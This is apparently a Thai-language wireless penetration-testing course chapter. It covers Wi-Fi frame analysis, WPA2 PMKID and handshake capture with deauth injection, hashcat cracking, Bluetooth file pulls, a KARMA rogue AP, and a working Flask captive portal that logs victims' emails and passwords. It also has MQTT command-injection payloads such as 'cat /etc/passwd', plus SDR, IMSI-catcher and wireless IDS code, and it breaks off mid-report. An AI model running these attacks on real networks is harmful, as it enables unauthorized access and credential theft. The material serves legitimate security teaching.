# ส่วนที่ 22: Wireless Security Advanced

## ขั้นตอนที่ 211: Wi-Fi Protocol Analysis

### IEEE 802.11 Frame Structure

```
802.11 Frame Types:
1. Management Frames
   - Beacon (type=0, subtype=8)
   - Probe Request/Response
   - Association Request/Response
   - Authentication/Deauthentication
   - Disassociation

2. Control Frames
   - RTS (Request to Send)
   - CTS (Clear to Send)
   - ACK (Acknowledgment)
   - Block ACK

3. Data Frames
   - Data
   - QoS Data
   - Null Function

Frame Format:
+------------+----------+---------+----------+---------+-------+----------+
| Frame Ctrl | Duration | Addr 1  | Addr 2   | Addr 3  | Seq # | Data     |
+------------+----------+---------+----------+---------+-------+----------+
    2 bytes     2 bytes   6 bytes   6 bytes   6 bytes  2 bytes  variable
```

### Scapy 802.11 Analysis

```python
#!/usr/bin/env python3
# wifi_analyzer.py - 802.11 Frame Analysis

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
import time
import sys
from collections import defaultdict

class WiFiAnalyzer:
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}  # BSSID -> network info
        self.clients = defaultdict(set)  # BSSID -> set of client MACs
        self.handshakes = []  # Captured handshakes
    
    def parse_beacon(self, pkt):
        """วิเคราะห์ Beacon frame"""
        if not pkt.haslayer(Dot11Beacon):
            return
        
        bssid = pkt[Dot11].addr3
        ssid = ''
        channel = 0
        enc = 'Open'
        
        # Parse information elements
        ie = pkt.getlayer(Dot11Elt)
        while ie:
            if ie.ID == 0:  # SSID
                ssid = ie.info.decode('utf-8', errors='ignore')
            elif ie.ID == 3:  # Channel
                channel = ord(ie.info)
            elif ie.ID == 48:  # RSN (WPA2)
                enc = 'WPA2'
            elif ie.ID == 221:  # Vendor specific (WPA)
                if ie.info[:4] == b'\x00\x50\xf2\x01':
                    enc = 'WPA'
            ie = ie.payload.getlayer(Dot11Elt)
        
        # Get signal strength from RadioTap
        signal = None
        if pkt.haslayer(RadioTap):
            try:
                signal = -(256 - pkt[RadioTap].dBm_AntSignal)
            except:
                pass
        
        self.networks[bssid] = {
            'ssid': ssid,
            'bssid': bssid,
            'channel': channel,
            'encryption': enc,
            'signal': signal,
            'last_seen': time.time()
        }
    
    def parse_probe_request(self, pkt):
        """วิเคราะห์ Probe Request"""
        if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4:
            client_mac = pkt[Dot11].addr2
            ssid = ''
            
            if pkt.haslayer(Dot11Elt):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            
            if ssid:
                print(f"[PROBE] {client_mac} -> {ssid}")
    
    def detect_deauth(self, pkt):
        """ตรวจหา Deauthentication attacks"""
        if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 12:
            src = pkt[Dot11].addr2
            dst = pkt[Dot11].addr1
            reason = pkt.payload.reason if hasattr(pkt.payload, 'reason') else 0
            print(f"[DEAUTH] {src} -> {dst} (reason: {reason})")
    
    def packet_handler(self, pkt):
        """จัดการแต่ละ packet"""
        self.parse_beacon(pkt)
        self.parse_probe_request(pkt)
        self.detect_deauth(pkt)
    
    def start_sniff(self, channel=None, timeout=30):
        """เริ่ม sniff"""
        print(f"[*] Starting capture on {self.interface}")
        sniff(
            iface=self.interface,
            prn=self.packet_handler,
            timeout=timeout,
            store=False
        )
    
    def print_networks(self):
        """แสดงเครือข่ายที่พบ"""
        print("\n{:<20} {:<18} {:>5} {:>8} {:>8}".format(
            'SSID', 'BSSID', 'CH', 'ENC', 'Signal'))
        print("-" * 65)
        
        for bssid, net in sorted(self.networks.items(), 
                                  key=lambda x: x[1].get('signal', -100) or -100,
                                  reverse=True):
            ssid = net['ssid'][:20] or '(hidden)'
            print("{:<20} {:<18} {:>5} {:>8} {:>8}".format(
                ssid, bssid, net['channel'],
                net['encryption'],
                f"{net['signal']}dBm" if net['signal'] else 'N/A'
            ))

# ตัวอย่างการใช้งาน
# analyzer = WiFiAnalyzer('wlan0mon')
# analyzer.start_sniff(timeout=60)
# analyzer.print_networks()
```

---

## ขั้นตอนที่ 212: WPA3 Security Analysis

### WPA3 vs WPA2

```
WPA2 (WPA-TKIP/CCMP):
- 4-Way Handshake
- PSK: Pre-Shared Key
- Vulnerable to: Dictionary attack, PMKID attack

WPA3:
- SAE (Simultaneous Authentication of Equals)
- Forward Secrecy (each session has unique key)
- More resistant to offline dictionary attacks
- Dragonfly Key Exchange

WPA3 Known Weaknesses:
- Dragonblood (2019): Cache-timing, downgrade attacks
- SAE confirm bypass
- Transition mode downgrade to WPA2
```

### PMKID Attack (WPA2)

```bash
# PMKID Attack - ไม่ต้องเชื่อมต่อ client

# Install hcxtools
sudo apt install hcxtools hcxdumptool -y

# Capture PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert เป็น hashcat format
hcxpcapngtool -o hashes.22000 pmkid.pcapng

# Crack ด้วย hashcat
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hashes.22000 -a 3 '?d?d?d?d?d?d?d?d'  # 8-digit

# หรือด้วย aircrack-ng
aircrack-ng pmkid.pcapng -w /usr/share/wordlists/rockyou.txt
```

### WPA2 4-Way Handshake Capture

```python
#!/usr/bin/env python3
# handshake_capture.py - WPA2 Handshake Capture

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11EAPOL
import subprocess
import time

class HandshakeCapture:
    def __init__(self, interface, target_bssid, target_channel):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.handshake_frames = []
        self.eapol_messages = {}
    
    def set_channel(self):
        """ตั้ง channel"""
        subprocess.run(['iw', self.interface, 'set', 'channel', 
                       str(self.target_channel)], check=True)
        print(f"[*] Set channel to {self.target_channel}")
    
    def send_deauth(self, client_mac, count=5):
        """ส่ง Deauthentication เพื่อบังคับ Handshake"""
        print(f"[*] Sending deauth to {client_mac}")
        
        deauth_pkt = (
            RadioTap() /
            Dot11(
                type=0, subtype=12,  # Deauthentication
                addr1=client_mac,
                addr2=self.target_bssid,
                addr3=self.target_bssid
            ) /
            Dot11Deauth(reason=7)  # Class 3 frame from nonassociated STA
        )
        
        sendp(deauth_pkt, iface=self.interface, count=count, verbose=False)
        print(f"[+] Sent {count} deauth frames")
    
    def packet_handler(self, pkt):
        """จับ EAPOL frames สำหรับ Handshake"""
        if not pkt.haslayer(Dot11EAPOL):
            return
        
        src = pkt[Dot11].addr2
        dst = pkt[Dot11].addr1
        
        if self.target_bssid in [src, dst]:
            msg_num = len(self.handshake_frames) + 1
            self.handshake_frames.append(pkt)
            print(f"[+] EAPOL message {msg_num} captured")
            
            if len(self.handshake_frames) >= 4:
                print("[+] Complete 4-way handshake captured!")
                wrpcap('handshake.cap', self.handshake_frames)
                return True
        
        return False
    
    def capture_handshake(self, timeout=30):
        """จับ Handshake"""
        self.set_channel()
        
        print(f"[*] Waiting for handshake from {self.target_bssid}")
        print(f"[*] Timeout: {timeout}s")
        
        sniff(
            iface=self.interface,
            prn=self.packet_handler,
            timeout=timeout,
            store=False
        )
        
        if len(self.handshake_frames) >= 2:
            print(f"[+] Captured {len(self.handshake_frames)} EAPOL frames")
            return True
        return False

# ตัวอย่าง
# capturer = HandshakeCapture('wlan0mon', 'AA:BB:CC:DD:EE:FF', 6)
# capturer.capture_handshake()
# capturer.send_deauth('FF:FF:FF:FF:FF:FF')  # Broadcast deauth
```

---

## ขั้นตอนที่ 213: Bluetooth Security

### Bluetooth Recon

```bash
# Bluetooth tools
sudo apt install bluez bluetooth -y

# สแกน Bluetooth devices
hciconfig
hciconfig hci0 up
hcitool scan                # Classic Bluetooth
hcitool lescan              # BLE (Low Energy)

# เพิ่มเติมการ scan
btmgmt scan
bluetooth-ctl scan on

# ดูที่ discover
hcitool inq
hcitool name <BD_ADDR>

# GATT services สำหรับ BLE
gatttool -b <ADDR> --primary
gatttool -b <ADDR> --characteristics
```

### BLE Security Testing

```python
#!/usr/bin/env python3
# ble_scanner.py - BLE Security Scanner

import asyncio
from bleak import BleakScanner, BleakClient

class BLEScanner:
    def __init__(self):
        self.devices = {}
    
    async def scan_devices(self, timeout=10):
        """สแกน BLE devices"""
        print(f"[*] Scanning for BLE devices ({timeout}s)...")
        
        devices = await BleakScanner.discover(timeout=timeout)
        
        for device in devices:
            self.devices[device.address] = {
                'name': device.name,
                'address': device.address,
                'rssi': device.rssi,
                'metadata': device.metadata
            }
            print(f"  [{device.rssi:>4}dBm] {device.address} - {device.name or '(unknown)'}")
        
        return devices
    
    async def enumerate_services(self, address):
        """ดู GATT services"""
        print(f"\n[*] Connecting to {address}...")
        
        async with BleakClient(address) as client:
            print(f"[+] Connected!")
            
            # List services
            services = client.services
            for service in services:
                print(f"\nService: {service.uuid}")
                print(f"  Description: {service.description}")
                
                for char in service.characteristics:
                    print(f"  Characteristic: {char.uuid}")
                    print(f"    Properties: {char.properties}")
                    
                    # Read if readable
                    if 'read' in char.properties:
                        try:
                            value = await client.read_gatt_char(char.uuid)
                            print(f"    Value: {value.hex()} ({value})")
                        except Exception as e:
                            print(f"    Read error: {e}")
    
    async def sniff_notifications(self, address, char_uuid, duration=30):
        """ฤาอ่าน BLE notifications"""
        print(f"[*] Sniffing notifications from {char_uuid}")
        
        notifications = []
        
        def notification_handler(sender, data):
            notifications.append({'sender': sender, 'data': data.hex()})
            print(f"[DATA] {sender}: {data.hex()}")
        
        async with BleakClient(address) as client:
            await client.start_notify(char_uuid, notification_handler)
            print(f"[*] Listening for {duration}s...")
            await asyncio.sleep(duration)
            await client.stop_notify(char_uuid)
        
        return notifications

# Run
async def main():
    scanner = BLEScanner()
    devices = await scanner.scan_devices()
    
    if devices:
        target = devices[0]
        await scanner.enumerate_services(target.address)

# asyncio.run(main())
```

### Bluetooth Classic Attacks

```bash
# BlueSnarfing, BlueBugging (educational)

# l2ping - Bluetooth ping สำหรับ discovery
l2ping -c 5 <BD_ADDR>

# sdptool - Browse services
sdptool browse <BD_ADDR>
sdptool search --bdaddr <BD_ADDR> OPUSH

# obexftp - OBEX file transfer
obexftp -b <BD_ADDR> -l           # List files
obexftp -b <BD_ADDR> -g 'telecom/devinfo.txt'  # Get file

# rfcomm - Serial port profile
rfcomm connect /dev/rfcomm0 <BD_ADDR> 1

# Kismet สำหรับ Bluetooth monitoring
kismet --capture bluetooth-linux-bluez source=hci0
```

---

## ขั้นตอนที่ 214: Rogue AP Advanced

### Karma Attack

```bash
# KARMA Attack: ตอบสนองทุก Probe Request
# Client ค้นหา network ที่เคยเชื่อมต่อ
# เราตอบสนองทุกคำร้อง -> client เชื่อมต่อ Rogue AP

# ติดตั้ง
install hostapd-wpe
# หรือใช้ hostapd-karma

# hostapd.conf
cat > /tmp/karma.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=FreeWifi  
channel=6
hw_mode=g
# Enable karma
karma_mode=1
EOF

hostapd /tmp/karma.conf
```

### Advanced Captive Portal

```python
#!/usr/bin/env python3
# captive_portal.py - Advanced Captive Portal

from flask import Flask, request, redirect, render_template_string
import subprocess
import logging
import json
from datetime import datetime

app = Flask(__name__)
captured_creds = []

PORTAL_HTML = """
<!DOCTYPE html>
<html>
<head>
<title>Free WiFi - Login Required</title>
<style>
body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
.login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }
h2 { color: #333; text-align: center; }
input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style>
</head>
<body>
<div class="login-box">
<h2>Free WiFi Access</h2>
<p>Please enter your credentials to connect to the internet.</p>
<form method="POST" action="/login">
<input type="email" name="email" placeholder="Email address" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Connect</button>
</form>
</div>
</body>
</html>
"""

SUCCESS_HTML = """
<!DOCTYPE html>
<html>
<head><title>Connected!</title></head>
<body>
<h2>Connected!</h2>
<p>You are now connected to the internet.</p>
<script>setTimeout(function(){ window.location='/'; }, 5000);</script>
</body>
</html>
"""

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return render_template_string(PORTAL_HTML)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    
    # Log captured credentials
    entry = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'email': email,
        'password': password,
        'user_agent': request.headers.get('User-Agent', '')
    }
    captured_creds.append(entry)
    
    print(f"[CAPTURED] {ip}: {email} / {password}")
    
    return render_template_string(SUCCESS_HTML)

@app.route('/admin/creds')
def view_creds():
    # Simple admin page (add auth in real use)
    return json.dumps(captured_creds, indent=2), 200, {'Content-Type': 'application/json'}

def setup_iptables(interface='wlan1', gateway_ip='10.0.0.1'):
    """ตั้ง iptables สำหรับ captive portal"""
    cmds = [
        'iptables -F',
        'iptables -t nat -F',
        f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {gateway_ip}:8080',
        f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination {gateway_ip}:8443',
        'iptables -t nat -A POSTROUTING -j MASQUERADE',
        'echo 1 > /proc/sys/net/ipv4/ip_forward'
    ]
    
    for cmd in cmds:
        subprocess.run(cmd, shell=True)
    
    print("[+] iptables configured")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
```

---

## ขั้นตอนที่ 215: Zigbee และ IoT Protocols

### Zigbee Security

```bash
# Zigbee tools
sudo apt install wireshark -y
pip3 install scapy[zigbee]

# Hardware: HackRF, YARD Stick One, หรือ Ubertooth

# Capture Zigbee traffic
# ต้องใช้ Wireshark กับ Zigbee dongle
# sudo apt install wireshark libpcap-dev
```

### IoT Protocol Analysis

```python
#!/usr/bin/env python3
# iot_analyzer.py - IoT Protocol Security Analysis

import paho.mqtt.client as mqtt
import json
import ssl
import time

class MQTTSecurityTester:
    def __init__(self, broker, port=1883):
        self.broker = broker
        self.port = port
        self.client = mqtt.Client()
        self.messages = []
        self.topics = set()
    
    def test_unauthenticated_access(self):
        """ทดสอบ MQTT โดยไม่มี auth"""
        try:
            result = self.client.connect(self.broker, self.port, 60)
            if result == 0:
                print(f"[CRITICAL] MQTT broker {self.broker} allows unauthenticated access!")
                return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
        return False
    
    def subscribe_all(self):
        """สมัครทุก topic (โดยใช้ wildcard)"""
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                client.subscribe('#')  # Subscribe to all topics
                print("[+] Subscribed to all topics (#)")
        
        def on_message(client, userdata, msg):
            topic = msg.topic
            payload = msg.payload.decode('utf-8', errors='ignore')
            
            self.topics.add(topic)
            self.messages.append({'topic': topic, 'payload': payload[:200]})
            
            # Check for interesting data
            keywords = ['password', 'token', 'key', 'sensor', 'temperature', 'humidity']
            if any(kw in topic.lower() or kw in payload.lower() for kw in keywords):
                print(f"[INTERESTING] {topic}: {payload[:100]}")
        
        self.client.on_connect = on_connect
        self.client.on_message = on_message
        
        self.client.connect(self.broker, self.port, 60)
        self.client.loop_start()
        
        print(f"[*] Listening on {self.broker}:{self.port}...")
        time.sleep(30)  # Listen for 30 seconds
        
        self.client.loop_stop()
        
        print(f"\n[+] Discovered {len(self.topics)} topics")
        print("\nTopics:")
        for topic in sorted(self.topics):
            print(f"  - {topic}")
    
    def publish_test(self, topic, payload):
        """ทดสอบ publish ไปยัง topic"""
        self.client.connect(self.broker, self.port, 60)
        result = self.client.publish(topic, payload)
        
        if result.rc == 0:
            print(f"[+] Published to {topic}: {payload}")
        self.client.disconnect()
    
    def test_command_injection(self):
        """ทดสอบ command injection ผ่าน MQTT"""
        dangerous_payloads = [
            '{"cmd": "cat /etc/passwd"}',
            '{"command": "whoami"}',
            '{"shell": "id"}',
            '$(id)',
            '`id`'
        ]
        
        # อุปกรณ์ส่ง payloadไปยัง topics ต่างๆ
        common_command_topics = [
            'cmd', 'command', 'exec', 'device/cmd',
            'home/cmd', 'iot/command'
        ]
        
        for topic in common_command_topics:
            for payload in dangerous_payloads:
                print(f"[*] Testing {topic}: {payload[:50]}")

# CoAP testing
def test_coap(host, port=5683):
    """Test CoAP (IoT protocol)"""
    try:
        import aiocoap
        print(f"[*] Testing CoAP on {host}:{port}")
        # CoAP testing requires async code
    except ImportError:
        print("[-] aiocoap not installed: pip3 install aiocoap")

tester = MQTTSecurityTester('192.168.1.100')
print("[*] Testing MQTT security...")
result = tester.test_unauthenticated_access()
if result:
    tester.subscribe_all()
```

---

## ขั้นตอนที่ 216: SDR (Software Defined Radio)

### SDR สำหรับ Security Research

```bash
# ติดตั้ง SDR Tools
sudo apt install gqrx gnuradio rtl-sdr -y
pip3 install pyrtlsdr

# ค้นหาอุปกรณ์ RTL-SDR
rtl_test
rtl_sdr -f 433920000 -s 2048000 -n 2048000 output.bin  # 433MHz

# GQRX สำหรับ spectrum analysis
gqrx

# RTL_433 - decode 433MHz signals (sensors, car keys, etc)
rtl_433 -f 433.9M -s 250k
rtl_433 -f 315M -A  # Auto-detect protocols

# Decode POCSAG (pager messages)
multimon-ng -t wav -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha capture.wav

# Aircraft tracking (ADS-B)
dump1090 --enable-agc --net
# Then visit http://localhost:8080

# Weather station data
rtl_433 -f 915M -F json | python3 weather_parser.py
```

### Python RTL-SDR Analysis

```python
#!/usr/bin/env python3
# sdr_scanner.py - RTL-SDR Signal Scanner

import numpy as np
try:
    from rtlsdr import RtlSdr
    HAS_RTL = True
except ImportError:
    HAS_RTL = False
    print("[-] pyrtlsdr not installed")

class SDRScanner:
    def __init__(self, sample_rate=2.048e6):
        self.sample_rate = sample_rate
        if HAS_RTL:
            self.sdr = RtlSdr()
            self.sdr.sample_rate = sample_rate
    
    def scan_frequency_range(self, start_freq, end_freq, step=1e6):
        """สแกนช่วงความถี่ frequency"""
        signals = []
        freq = start_freq
        
        while freq <= end_freq:
            power = self.measure_power(freq)
            signals.append({'freq': freq, 'power': power})
            print(f"  {freq/1e6:.1f} MHz: {power:.1f} dBm")
            freq += step
        
        return signals
    
    def measure_power(self, freq, num_samples=1024):
        """วัดกำลังไฟฟ้ที่ frequency"""
        if not HAS_RTL:
            return -100 + np.random.uniform(-10, 10)
        
        self.sdr.center_freq = freq
        samples = self.sdr.read_samples(num_samples)
        power = 10 * np.log10(np.mean(np.abs(samples)**2) + 1e-10)
        return power
    
    def detect_signals(self, freq, threshold=-60, duration=5):
        """Detect และแสดง signals"""
        import time
        
        print(f"[*] Monitoring {freq/1e6:.1f} MHz for {duration}s")
        start = time.time()
        
        detections = []
        while time.time() - start < duration:
            power = self.measure_power(freq)
            if power > threshold:
                detections.append({
                    'time': time.time() - start,
                    'power': power,
                    'freq': freq
                })
                print(f"  [!] Signal detected at {freq/1e6:.1f} MHz: {power:.1f} dBm")
            time.sleep(0.1)
        
        return detections
    
    def decode_ook_signal(self, samples, sample_rate):
        """Decode OOK (On-Off Keying) - ใช้ใน remote controls"""
        # Convert to binary based on amplitude
        amplitude = np.abs(samples)
        threshold = np.mean(amplitude) * 0.5
        binary = (amplitude > threshold).astype(int)
        
        # Find pulse widths
        transitions = np.diff(binary)
        pulse_starts = np.where(transitions != 0)[0]
        
        pulses = []
        for i in range(len(pulse_starts) - 1):
            duration_samples = pulse_starts[i+1] - pulse_starts[i]
            duration_us = (duration_samples / sample_rate) * 1e6
            pulse_value = binary[pulse_starts[i] + 1]
            pulses.append((pulse_value, duration_us))
        
        return pulses
    
    def close(self):
        if HAS_RTL:
            self.sdr.close()

scanner = SDRScanner()
print("[*] SDR Scanner initialized")
print("Scanning 433-435 MHz:")
signals = scanner.scan_frequency_range(433e6, 435e6, step=0.5e6)
print(f"\n[+] Scanned {len(signals)} frequencies")
```

---

## ขั้นตอนที่ 217: 5G Security

### 5G Architecture Security

```
5G Network Components:

[UE - User Equipment]
    |
    | Radio
    |
[gNB - Base Station (Next Gen NodeB)]
    |
    | N2/N3
    |
[5GC - 5G Core Network]
  |-- AMF (Access and Mobility Management)
  |-- SMF (Session Management)
  |-- UPF (User Plane)
  |-- UDM (User Data Management)
  |-- PCF (Policy Control)
  |-- NEF (Network Exposure)
  |-- NRF (Network Repository)

5G Security Features:
- SUPI/SUCI (Subscriber concealment)
- Enhanced authentication (5G-AKA, EAP-AKA')
- Network slice security
- Service-based architecture

5G Attack Surface:
- Base station spoofing
- Protocol downgrade (5G -> 4G -> 3G)
- API security in 5GC
- Open RAN security issues
```

### IMSI Catcher Detection

```python
#!/usr/bin/env python3
# imsi_catcher_detector.py - Detect IMSI Catchers

import subprocess
import json

class IMSICatcherDetector:
    def __init__(self):
        self.baseline_towers = {}  # Known legitimate towers
        self.suspicious_towers = []
    
    def scan_towers(self):
        """Scan nearby cell towers"""
        towers = []
        
        # ใช้ nmcli หรือ tool อื่นๆ เพื่อสแกน towers
        try:
            result = subprocess.run(
                ['mmcli', '-m', '0', '--3gpp-scan'],
                capture_output=True, text=True, timeout=30
            )
            # Parse output
            towers.append({'source': 'mmcli', 'data': result.stdout[:200]})
        except:
            pass
        
        return towers
    
    def detect_imsi_catcher_indicators(self, tower_info):
        """หาสัญญาณ IMSI Catcher"""
        indicators = []
        
        # Indicator 1: Unusually strong signal
        if tower_info.get('signal_strength', 0) > -50:  # Very strong
            indicators.append({
                'type': 'Strong Signal',
                'description': 'Unusually strong signal - possible nearby IMSI catcher',
                'severity': 'Medium'
            })
        
        # Indicator 2: Encryption disabled (2G)
        if tower_info.get('encryption') == 'A5/0':
            indicators.append({
                'type': 'No Encryption',
                'description': 'Call encryption disabled - IMSI catcher may be stripping encryption',
                'severity': 'High'
            })
        
        # Indicator 3: Downgrade to 2G
        if tower_info.get('network_type') == '2G' and self.baseline_towers.get(tower_info.get('cell_id')):
            baseline = self.baseline_towers[tower_info['cell_id']]
            if baseline.get('network_type') in ['3G', '4G', '5G']:
                indicators.append({
                    'type': 'Network Downgrade',
                    'description': f'Tower {tower_info["cell_id"]} downgraded from {baseline["network_type"]} to 2G',
                    'severity': 'High'
                })
        
        # Indicator 4: Unknown Cell ID
        cell_id = tower_info.get('cell_id')
        if cell_id and cell_id not in self.baseline_towers:
            indicators.append({
                'type': 'Unknown Tower',
                'description': f'Cell ID {cell_id} not in baseline database',
                'severity': 'Low'
            })
        
        return indicators
    
    def generate_alert(self, indicators):
        """สร้าง alert"""
        if not indicators:
            return None
        
        max_severity = 'Low'
        for ind in indicators:
            if ind['severity'] == 'High':
                max_severity = 'High'
                break
            elif ind['severity'] == 'Medium':
                max_severity = 'Medium'
        
        return {
            'alert': 'Possible IMSI Catcher Detected',
            'severity': max_severity,
            'indicators': indicators
        }

detector = IMSICatcherDetector()
print("[*] IMSI Catcher Detector initialized")
print("[*] Scanning cell towers...")
towers = detector.scan_towers()
print(f"[+] Found {len(towers)} tower records")
```

---

## ขั้นตอนที่ 218: Wireless IDS/IPS

### Detection Rules

```python
#!/usr/bin/env python3
# wireless_ids.py - Wireless Intrusion Detection System

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth
from collections import defaultdict
import time

class WirelessIDS:
    def __init__(self, interface, alert_threshold=10):
        self.interface = interface
        self.alert_threshold = alert_threshold
        self.deauth_counter = defaultdict(int)
        self.probe_counter = defaultdict(list)
        self.known_aps = {}  # BSSID -> SSID mapping
        self.alerts = []
    
    def detect_deauth_flood(self, pkt):
        """ตรวจหา Deauth flood attack"""
        if pkt.haslayer(Dot11Deauth):
            src = pkt[Dot11].addr2
            self.deauth_counter[src] += 1
            
            if self.deauth_counter[src] >= self.alert_threshold:
                self.create_alert(
                    'Deauth Flood',
                    f'Host {src} sent {self.deauth_counter[src]} deauth frames',
                    'HIGH',
                    src
                )
                self.deauth_counter[src] = 0  # Reset
    
    def detect_evil_twin(self, pkt):
        """ตรวจหา Evil Twin AP"""
        if not pkt.haslayer(Dot11Beacon):
            return
        
        bssid = pkt[Dot11].addr3
        ie = pkt.getlayer(Dot11Elt)
        ssid = ''
        
        while ie:
            if ie.ID == 0:
                ssid = ie.info.decode('utf-8', errors='ignore')
                break
            ie = ie.payload.getlayer(Dot11Elt)
        
        if not ssid:
            return
        
        # ตรวจสอบ SSID เดียวกัน แต่ BSSID ต่างกัน
        for known_bssid, known_ssid in self.known_aps.items():
            if known_ssid == ssid and known_bssid != bssid:
                self.create_alert(
                    'Evil Twin AP',
                    f'Possible Evil Twin: SSID "{ssid}" from {bssid} (known BSSID: {known_bssid})',
                    'CRITICAL',
                    bssid
                )
                return
        
        self.known_aps[bssid] = ssid
    
    def detect_probe_sweep(self, pkt):
        """ตรวจหา Probe Request sweep (reconnaissance)"""
        if not (pkt.haslayer(Dot11) and 
                pkt[Dot11].type == 0 and 
                pkt[Dot11].subtype == 4):
            return
        
        src = pkt[Dot11].addr2
        now = time.time()
        
        # Track probes per source
        self.probe_counter[src].append(now)
        
        # Keep only last 10 seconds
        self.probe_counter[src] = [
            t for t in self.probe_counter[src]
            if now - t <= 10
        ]
        
        # Alert if too many probes
        if len(self.probe_counter[src]) >= 20:
            self.create_alert(
                'Probe Sweep',
                f'{src} sent {len(self.probe_counter[src])} probe requests in 10 seconds',
                'MEDIUM',
                src
            )
    
    def create_alert(self, alert_type, message, severity, source_mac):
        """สร้าง alert"""
        alert = {
            'type': alert_type,
            'message': message,
            'severity': severity,
            'source': source_mac,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.alerts.append(alert)
        
        severity_prefix = {'CRITICAL': '!!!', 'HIGH': '!!', 'MEDIUM': '!', 'LOW': '-'}[severity]
        print(f"[ALERT][{severity}] {alert_type}: {message}")
    
    def packet_handler(self, pkt):
        self.detect_deauth_flood(pkt)
        self.detect_evil_twin(pkt)
        self.detect_probe_sweep(pkt)
    
    def start(self, timeout=None):
        print(f"[*] Wireless IDS started on {self.interface}")
        sniff(
            iface=self.interface,
            prn=self.packet_handler,
            timeout=timeout,
            store=False
        )

# ตัวอย่าง
# ids = WirelessIDS('wlan0mon')
# ids.start(timeout=60)
# print(f"\n[+] Total alerts: {len(ids.alerts)}")
```

---

## ขั้นตอนที่ 219: การเข้ารหัส Wi-Fi Passwords

### Password Cracking Strategies

```bash
# WPA2 Dictionary Attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b TARGET_BSSID capture.cap

# Hashcat WPA2
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hashes.22000 -a 3 '?d?d?d?d?d?d?d?d'  # 8 digits
hashcat -m 22000 hashes.22000 -a 3 '?l?l?l?l?l?l?l?l'  # 8 lowercase
hashcat -m 22000 hashes.22000 -a 6 words.txt '?d?d?d'    # word + 3 digits

# Rule-based attack
hashcat -m 22000 hashes.22000 -r /usr/share/hashcat/rules/best64.rule words.txt
hashcat -m 22000 hashes.22000 -r /usr/share/hashcat/rules/rockyou-30000.rule words.txt

# Combinator attack
hashcat -m 22000 hashes.22000 -a 1 words1.txt words2.txt

# Prince attack
pp64 words.txt | hashcat -m 22000 hashes.22000
```

### Custom Wordlist Generation

```python
#!/usr/bin/env python3
# wordlist_generator.py - Generate targeted wordlists

import itertools
import string

class WordlistGenerator:
    def generate_wifi_passwords(self, ssid, variations=True):
        """สร้าง wordlist จาก SSID"""
        passwords = []
        
        # SSID-based
        passwords.append(ssid)
        passwords.append(ssid.lower())
        passwords.append(ssid.upper())
        
        # Common suffixes
        suffixes = ['123', '1234', '12345', '123456', 
                    '@123', '#123', '!', '!@#',
                    '2023', '2024', '2025']
        
        for suffix in suffixes:
            passwords.append(ssid + suffix)
            passwords.append(ssid.lower() + suffix)
        
        # Common patterns
        common_passwords = [
            '12345678', 'password', 'abc123456',
            ssid + 'wifi', ssid + 'pass',
            'admin' + ssid, ssid + 'admin'
        ]
        passwords.extend(common_passwords)
        
        return list(set(passwords))
    
    def generate_numeric_range(self, length, start=0, end=None):
        """สร้าง numeric passwords"""
        if end is None:
            end = 10**length
        
        for i in range(start, min(end, 10**length)):
            yield str(i).zfill(length)
    
    def generate_leet_speak(self, word):
        """สร้าง leet speak variations"""
        leet_map = {
            'a': ['4', '@'],
            'e': ['3'],
            'i': ['1', '!'],
            'o': ['0'],
            's': ['5', '$'],
            't': ['7'],
            'g': ['9'],
            'b': ['8']
        }
        
        variations = [word]
        
        for char, replacements in leet_map.items():
            new_variations = []
            for var in variations:
                new_variations.append(var)
                if char in var.lower():
                    for rep in replacements:
                        new_var = var.lower().replace(char, rep)
                        new_variations.append(new_var)
            variations = new_variations
        
        return list(set(variations))
    
    def save_wordlist(self, passwords, filename):
        """บันทึก wordlist"""
        with open(filename, 'w') as f:
            for pw in passwords:
                f.write(pw + '\n')
        print(f"[+] Saved {len(passwords)} passwords to {filename}")

gen = WordlistGenerator()
ssid = 'HomeNetwork'
passwords = gen.generate_wifi_passwords(ssid)
print(f"[+] Generated {len(passwords)} passwords for SSID: {ssid}")
for pw in passwords[:10]:
    print(f"  {pw}")

leet = gen.generate_leet_speak('password')
print(f"\n[+] Leet speak variations: {len(leet)}")
for var in leet[:5]:
    print(f"  {var}")
```

---

## ขั้นตอนที่ 220: Wireless Penetration Test Report

### Wireless PT Report

```python
#!/usr/bin/env python3
# wireless_pt_report.py - Wireless Pentest Report Generator

import json
from datetime import datetime

def generate_wireless_report(findings):
    """สร้าง Wireless PT Report"""
    
    report = f"""
# Wireless Security Assessment Report

